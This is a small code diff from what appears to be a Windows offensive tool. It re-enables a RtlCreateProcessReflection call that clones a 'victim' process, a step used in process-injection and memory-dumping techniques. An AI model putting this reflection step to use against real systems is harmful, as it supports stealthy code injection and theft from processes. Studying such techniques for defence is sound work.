@@ -408,7 +408,7 @@ int main(int argc, char** argv)
 		return -1;
 	}
 
-	/*T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
+	T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
 	NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, nullptr, NULL, &info);
 	if (reflectRet == STATUS_SUCCESS) {
 		std::cout << "[+] Succesfully Mirrored to new PID: " << (DWORD)info.ReflectionClientId.UniqueProcess << std::endl;
@@ -417,5 +417,5 @@ int main(int argc, char** argv)
 		std::cout << "[!] Error Mirroring: ERROR " << GetLastError() << std::endl;
 	}
 
-	return reflectRet;*/
+	return reflectRet;
 }
